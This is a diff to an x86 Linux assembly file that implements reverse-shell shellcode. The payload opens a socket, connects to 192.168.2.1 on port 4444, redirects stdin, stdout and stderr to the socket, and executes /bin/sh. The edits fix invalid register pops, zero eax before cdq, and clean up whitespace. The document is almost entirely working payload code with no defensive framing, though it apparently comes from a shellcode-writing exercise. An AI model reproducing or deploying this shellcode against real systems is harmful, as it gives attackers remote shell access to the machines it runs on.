@@ -16,7 +16,7 @@
 ;
 
 
-global _start			
+global _start
 
 section .text
 _start:
@@ -24,18 +24,21 @@ _start:
 
 
 	; create_socket
-	
-	;null the edx
+
+	;null eax for cdq
+    xor eax, eax
+
+    ;null the edx
 	cdq
-	
+
 	; syscall 102 in eax
 	push byte 0x66
- 	pop al
- 	
+ 	pop eax
+
 	; 1 in ebx for type of socketcall
 	xor ebx, ebx
 	inc ebx
- 
+
 	; Build the array of arg
 	; push 0 for protocol
 	push edx
@@ -58,11 +61,11 @@ _start:
 	; socket_connect
 	; mov socket syscall number in eax
 	push byte 0x66
-	pop al
+	pop eax
 
 	; increment ebx for AF_INET
 	inc ebx
-	
+
 	; Build the array of arg
 	push edx
 	; Push the ip address 192.168.2.1 in reverse order
@@ -71,23 +74,23 @@ _start:
 	push word 0x5c11
 	; Push 0x2 for type
 	push word bx
-	
+
 	; save pointer of arg array in ecx
 	mov ecx, esp
 
  	; Push the sizeof arg array
 	push byte 16
-	
+
 	; Push the struct pointer
 	push ecx
-	
+
 	; Push the socket file descriptor
 	push esi
-	
+
 	; Mov in ecx the pointer of argument array
 	mov ecx, esp
 
-	; Increment ebx for connect	
+	; Increment ebx for connect
 	inc ebx
 
 	; Call interrupt
@@ -95,26 +98,26 @@ _start:
 
 
 
-	
+
 	; Dup2 syscall template
 	; mov the socket file descriptor in ebx
 	xchg esi, ebx
-	
+
 	; Set 2 in ecx
 	push byte 0x2
-	pop cl
-	
+	pop ecx
+
 	; Dup2 loop instructions
 	dup_loop:
   		; mov the syscall number 63 in al
 		mov byte al, 0x3f
-  		
+
 		; Interrupt
 		int 0x80
-		
+
 		; Decrement ecx
 		dec ecx
-		
+
 		; If the sign flag is not set, ecx is not neg
 		jns dup_loop
 
@@ -133,18 +136,18 @@ _start:
 
 	;push null terminated for env
 	push edx
-	
+
 	; saving null in edx
 	mov edx, esp
 
 	; Push pointer of /bin/sh on the stack
 	push ebx
-	
+
 	; Save pointer in the ecx
 	mov ecx, esp
 
-	; mov 0xb 11 for execve syscall	
+	; mov 0xb 11 for execve syscall
 	mov byte al, 0xb
-	
+
 	; Interrupt
 	int 0x80
